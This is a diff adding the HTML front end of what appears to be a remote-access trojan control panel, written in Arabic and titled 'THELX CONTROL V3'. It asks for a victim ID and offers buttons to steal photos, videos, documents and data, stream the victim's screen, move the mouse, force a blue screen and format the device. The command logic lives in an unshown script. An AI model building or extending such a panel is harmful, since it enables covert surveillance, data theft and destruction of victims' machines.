@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>ER0R V3 - THELX SUPREME PANEL</title>
+    <style>
+        body { background: #000; color: #6001d2; font-family: 'Courier New', monospace; text-align: center; margin: 0; padding: 20px; }
+        .main-container { border: 2px solid #6001d2; max-width: 1000px; margin: auto; padding: 25px; border-radius: 20px; box-shadow: 0 0 40px #6001d2; background: rgba(5, 5, 5, 0.9); }
+        h1 { font-size: 35px; text-transform: uppercase; letter-spacing: 8px; margin-bottom: 20px; text-shadow: 0 0 10px #6001d2; }
+        .status-bar { background: #111; padding: 10px; margin-bottom: 20px; border-radius: 5px; font-size: 14px; border-left: 5px solid #6001d2; }
+        .input-group { margin-bottom: 25px; }
+        input { background: #000; border: 1px solid #6001d2; color: #fff; padding: 15px; width: 80%; text-align: center; border-radius: 10px; font-size: 18px; outline: none; }
+        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; }
+        .btn { background: #000; border: 1px solid #6001d2; color: #fff; padding: 15px; cursor: pointer; border-radius: 8px; font-weight: bold; transition: 0.4s; }
+        .btn:hover { background: #6001d2; color: #fff; box-shadow: 0 0 20px #6001d2; transform: translateY(-3px); }
+        .danger { border-color: #ff0000; color: #ff0000; }
+        .danger:hover { background: #ff0000; color: #fff; box-shadow: 0 0 20px #ff0000; }
+        #console { background: #050505; border: 1px solid #222; height: 150px; margin-top: 25px; overflow-y: auto; text-align: left; padding: 15px; color: #0f0; font-size: 13px; border-radius: 10px; }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <h1>THELX CONTROL V3</h1>
+        <div class="status-bar">🛰️ نظام السيطرة والتحكم عن بعد | الحالة: متصل بالخادم HQ</div>
+        
+        <div class="input-group">
+            <input type="text" id="targetID" placeholder="-- أدخل معرف الضحية (Target ID) --">
+        </div>
+
+        <div class="grid">
+            <button class="btn" onclick="sendCommand('سحب صور')">🖼️ سحب الصور</button>
+            <button class="btn" onclick="sendCommand('سحب فيديوهات')">🎥 سحب فيديوهات</button>
+            <button class="btn" onclick="sendCommand('سحب مستندات')">📄 سحب مستندات</button>
+            <button class="btn" onclick="sendCommand('سحب أرشيف')">📦 سحب أرشيف</button>
+            <button class="btn" onclick="sendCommand('سحب داتا')">🗄️ سحب داتا</button>
+            <button class="btn" style="color: cyan;" onclick="sendCommand('بث مباشر')">🔴 بث حي للشاشة</button>
+            <button class="btn" onclick="sendCommand('تحريك الماوس')">🖱️ تحريك الماوس</button>
+            <button class="btn" onclick="sendCommand('تزمير')">📢 إطلاق تزمير</button>
+            <button class="btn danger" onclick="sendCommand('شاشة الموت')">💀 شاشة الموت</button>
+            <button class="btn danger" onclick="sendCommand('فرمتة')">🔥 فرمتة الجهاز</button>
+        </div>
+
+        <div id="console">>_ نظام التشغيل جاهز. بانتظار إدخال الأوامر...</div>
+    </div>
+    <script src="app-min.js"></script>
+</body>
+</html>
